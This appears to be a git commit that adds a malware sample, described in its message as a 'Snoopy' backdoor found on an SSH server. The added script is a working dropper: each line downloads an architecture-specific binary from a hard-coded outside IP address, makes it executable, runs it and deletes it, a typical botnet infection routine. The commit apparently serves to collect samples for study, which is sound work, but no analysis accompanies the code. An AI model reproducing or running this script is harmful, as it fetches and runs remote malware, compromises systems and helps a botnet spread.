77f26a0d6ae5fc9126cc1904c9a3a998041e0d14
sX89q <77665775+sX89q@users.noreply.github.com>
2022-06-03 22:26:25 +0300

    Snoopy backdoor found on random SSH server

---
+++ snoopy/SnOoPy.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/m-i.p-s.SNOOPY; chmod +x m-i.p-s.SNOOPY; ./m-i.p-s.SNOOPY; rm -rf m-i.p-s.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/m-p.s-l.SNOOPY; chmod +x m-p.s-l.SNOOPY; ./m-p.s-l.SNOOPY; rm -rf m-p.s-l.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/s-h.4-.SNOOPY; chmod +x s-h.4-.SNOOPY; ./s-h.4-.SNOOPY; rm -rf s-h.4-.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/x-8.6-.SNOOPY; chmod +x x-8.6-.SNOOPY; ./x-8.6-.SNOOPY; rm -rf x-8.6-.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/a-r.m-6.SNOOPY; chmod +x a-r.m-6.SNOOPY; ./a-r.m-6.SNOOPY; rm -rf a-r.m-6.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/x-3.2-.SNOOPY; chmod +x x-3.2-.SNOOPY; ./x-3.2-.SNOOPY; rm -rf x-3.2-.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/a-r.m-7.SNOOPY; chmod +x a-r.m-7.SNOOPY; ./a-r.m-7.SNOOPY; rm -rf a-r.m-7.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/p-p.c-.SNOOPY; chmod +x p-p.c-.SNOOPY; ./p-p.c-.SNOOPY; rm -rf p-p.c-.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/i-5.8-6.SNOOPY; chmod +x i-5.8-6.SNOOPY; ./i-5.8-6.SNOOPY; rm -rf i-5.8-6.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/m-6.8-k.SNOOPY; chmod +x m-6.8-k.SNOOPY; ./m-6.8-k.SNOOPY; rm -rf m-6.8-k.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/p-p.c-.SNOOPY; chmod +x p-p.c-.SNOOPY; ./p-p.c-.SNOOPY; rm -rf p-p.c-.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/a-r.m-4.SNOOPY; chmod +x a-r.m-4.SNOOPY; ./a-r.m-4.SNOOPY; rm -rf a-r.m-4.SNOOPY
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://54.38.243.193/a-r.m-5.SNOOPY; chmod +x a-r.m-5.SNOOPY; ./a-r.m-5.SNOOPY; rm -rf a-r.m-5.SNOOPY
